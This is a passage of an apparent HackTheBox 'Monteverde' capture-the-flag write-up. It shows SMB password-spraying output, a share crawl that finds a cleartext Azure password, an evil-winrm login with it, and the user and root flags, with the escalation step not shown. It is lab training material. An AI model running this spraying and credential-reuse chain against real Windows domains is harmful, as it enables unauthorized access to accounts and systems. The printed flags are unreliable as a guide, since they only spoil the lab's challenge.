SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Password123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Password123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs 


we found MEGABANK\SABatchJobs:SABatchJobs 


Next, let's crawl the users$ share for potentially interesting files, such as Office documents, text and XML
files.
 smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A'(xlsx|docx|txt|xml)' -R
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
[+] Starting search for files matching '(xlsx|docx|txt|xml)' on share azure_uploads.
[+] Starting search for files matching '(xlsx|docx|txt|xml)' on share IPC$.
[+] Starting search for files matching '(xlsx|docx|txt|xml)' on share NETLOGON.
[+] Starting search for files matching '(xlsx|docx|txt|xml)' on share SYSVOL.
[+] Starting search for files matching '(xlsx|docx|txt|xml)' on share users$.
[+] Match found! Downloading: users$\mhope\azure.xml


if we read the downloaded file, we find some credentials for mhope user:

cat 10.10.10.172-users_mhope_azure.xml                                                   
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>           


we can use these credentials to try to log in as mhope:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Monteverde]
└─$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> 


it works!

user flag:

*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
659bae78e0ec90357f19ba2036536a2d


*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   3/28/2023 4:38:42 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.














root flag:
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
aabab7ec7a80e4e2f9df8accb3e6b668

